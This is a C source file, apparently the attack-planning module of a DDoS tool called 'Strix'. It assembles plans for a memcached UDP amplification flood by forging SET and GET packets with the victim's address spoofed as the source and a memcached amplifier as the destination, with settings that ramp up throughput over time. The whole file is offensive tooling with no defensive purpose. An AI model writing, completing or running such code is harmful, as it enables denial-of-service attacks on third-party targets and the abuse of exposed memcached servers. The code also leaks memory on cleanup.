#include "strix.h"
#include "packetforge.h"
#include "planner.h"

#define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT

static AttackData * _createAttackData( AttackDraft *draft )
{
  AttackData *newData;

  memalloc( (void *)&newData, sizeof( AttackData ) ); 
  newData->setPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, GetPort(draft->target_port), GetPort(draft->amp_port), MEMCACHED_SET );
  newData->getPacket = ForgeMemcachedUDP( draft->amp_ip, draft->target_ip, GetPort(draft->target_port), GetPort(draft->amp_port), MEMCACHED_GET );
  newData->initialThroughput = draft->initialThroughput;
  newData->incThroughput = draft->incrementThroughput;
  newData->incFrequency = draft->timeFrequency;
  newData->timer = draft->timer;

  return newData;
}

AttackPlan * StrixPlanner( AttackDraft *draft, int draftSize )
{
  AttackPlan *plan = NULL;

  assert( NULL != draft );
  assert(draftSize > 0);

  memalloc( (void *)&plan, sizeof(AttackPlan) );
  memalloc( (void *)&plan->atkPlans, sizeof(AttackData) * draftSize );
  plan->totalPlans = draftSize;
  
  for(int i = 0; i < draftSize; i++){
    plan->atkPlans[i] = _createAttackData( &draft[i] );   
  }

  return plan;
}

void DestroyStrixPlan( AttackPlan **plan )
{
  if( NULL == *plan ){
    return;
  }

  for(int i = 0; i < (*plan)->totalPlans; i++){
    release_packet( (*plan)->atkPlans[i]->getPacket );
    release_packet( (*plan)->atkPlans[i]->setPacket );
  }
  
  free(*plan);
}
